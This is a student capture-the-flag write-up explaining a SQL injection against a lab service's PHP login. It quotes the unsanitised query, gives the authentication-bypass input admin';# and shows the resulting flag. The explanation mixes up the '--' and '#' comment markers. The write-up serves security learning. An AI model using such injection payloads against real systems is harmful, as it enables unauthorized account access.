# CTF - Week 8

## SQL Injections

> From the *index.php* code we could observe how the SQL queries were formed from a user input:

```php
    ...

    require_once 'config.php';

    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $query = "SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
    
    ...

```

<br>

## **For each login attempt the query to be executed will be:**
```php
SELECT username FROM user WHERE username = '".$username."' AND password = '".$password."'";
```
- The *$username* and *$password* are information provided by the user as they try to login.

<br>

- The program checks whether any record matches with the provided username and password;
    - if there is a match, the user is successfully authenticated, and is given the corresponding user information.
    - If there is no match, the authentication fails.

<br>

- However, what the program fails to do is sanitization of the users input before the query, therefore making it vulnerable to an sql injection

<br>

## **What input would allow us to usurp the query?**

```sql
    admin';#
```

- We need to input a valid username, which most of the time admin works (like it worked on this one).
- After that, we write a an apostrophe followed by a semicolon (`';`) that will close the existing string `'".$username."'`, terminating the original query.
- Finally we put a double hyphen (`--`) after the previous input, making it so that the rest of the query is commented out, eliminating the need to have to type out a password.
    - However a password entry was mandatory, so we just typed out anything because it won't really matter as it will be commented out.

<br>

## With these changes the query sent would be:

```sql
    SELECT username FROM user WHERE username = 'admin'; -- AND  password = 'a'
```

> Since the # symbol acts as comment and everything after is ignored, the query becomes:

```sql
    SELECT username FROM user WHERE username = 'admin';
```

>  This allowed us to bypass the *"EasyVault"* service and obtain the following message:

```txt
    You have been logged in as admin

    flag{98ba2ee82ee740b3cb025dda423f48e4}
```

> Giving us the flag needed to complete the challenge.